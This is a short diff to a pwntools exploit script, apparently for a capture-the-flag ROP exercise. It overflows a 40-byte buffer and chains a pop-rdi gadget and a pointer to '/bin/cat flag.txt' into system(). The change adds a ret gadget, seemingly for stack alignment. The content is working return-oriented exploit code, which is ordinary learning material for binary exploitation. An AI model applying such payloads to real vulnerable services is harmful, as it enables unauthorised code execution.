@@ -20,10 +20,12 @@ p = process(context.binary.path)
 g_rdi = 0x4007c3 # pop rdi; ret;
 g_system = 0x400560 # system function
 g_string = 0x601060 # /bin/cat flag.txt
+g_ret = 0x40053e # ret
 
 payload = b"a" * (40)
 payload += p64(g_rdi)
 payload += p64(g_string)
+payload += p64(g_ret)
 payload += p64(g_system)
 
 p.sendline(payload)
